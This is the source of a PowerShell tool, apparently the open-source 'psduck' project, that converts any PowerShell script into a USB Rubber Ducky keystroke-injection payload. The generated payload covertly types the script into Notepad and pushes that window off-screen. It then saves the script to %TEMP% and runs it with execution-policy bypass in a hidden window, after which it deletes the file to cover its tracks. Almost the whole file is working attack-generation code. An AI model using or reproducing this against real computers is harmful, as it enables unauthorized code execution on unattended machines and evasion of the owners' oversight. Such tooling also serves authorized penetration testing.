<#
.SYNOPSIS

A PowerShell script for converting other PowerShell scripts to USB Rubber Ducky payloads
https://github.com/seanthegeek/psduck

Copyright 2016 Sean Whalen

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Sean Whalen (@SeanTheGeek)
Version: 1.1.0
Required Dependencies: Java runtime
Optional Dependencies: None
    
.DESCRIPTION

A PowerShell script for converting other PowerShell scripts to USB Rubber Ducky payloads

.PARAMETER Path

The path to the script to convert
#>

[CmdletBinding()] param(
  [Parameter(Position = 0,Mandatory = $True)]
  [string]$Path
)

$ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Definition

Import-Module (Join-Path $ScriptPath DTW.PS.FileSystem.Encoding.psm1)
Import-Module (Join-Path $ScriptPath DTW.PS.PrettyPrinterV1.psm1)


function GetDownArrows ([int]$Number) {

  return "DOWNARROW`r`n" * $Number
}



$HideWindowScript = @"
DELAY 750
ALT SPACE
DELAY 750
STRING m
DELAY 750
{0}
DELAY 750
ENTER
"@

$DownArrows = GetDownArrows 61
$DownArrows = $DownArrows.TrimEnd()

$HideWindowScript = [string]::Format($HideWindowScript,$DownArrows)

[string]$Path = Resolve-Path $Path
$RandomFileName = [System.IO.Path]::GetRandomFileName().Split(‘.’)[0]
$TxtPath = $Path + ".txt"

Edit-DTWCleanScript $Path
$content = [IO.File]::ReadAllText($Path)


$PreScript = @"
DELAY 750
CONTROL ESCAPE
DELAY 750
STRING notepad.exe
ENTER
DELAY 750
ENTER
{0}
"@

$PreScript = [string]::Format($PreScript,$HideWindowScript)

$PostScript = @"

DELAY 500
ENTER
CTRL S
DELAY  750
STRING %TEMP%\{0}.ps1
ENTER
DELAY 750
ALT F4
DELAY 750
CONTROL ESCAPE
DELAY 750
STRING powershell.exe --ExecutionPolicy Bypass -WindowStyle Hidden -File %TEMP%\{0}.ps1
ENTER
DELAY 750
CONTROL ESCAPE
DELAY 750
STRING powershell.exe Remove-Item %TEMP%\{0}.ps1
ENTER
"@
$PostScript = [string]::Format($PostScript,$RandomFileName)
$PreScript | Out-File -Encoding ascii $TxtPath
$PsLines = Get-Content $Path
foreach ($line in $PsLines) {
  [string]::Format("STRING {0}`r`nENTER",$line.Trim()) | Out-File -Append -Encoding ascii $TxtPath
}
$PostScript | Out-File -Append -Encoding ascii $TxtPath
java -jar (Join-Path $ScriptPath encoder.jar) -i $TxtPath
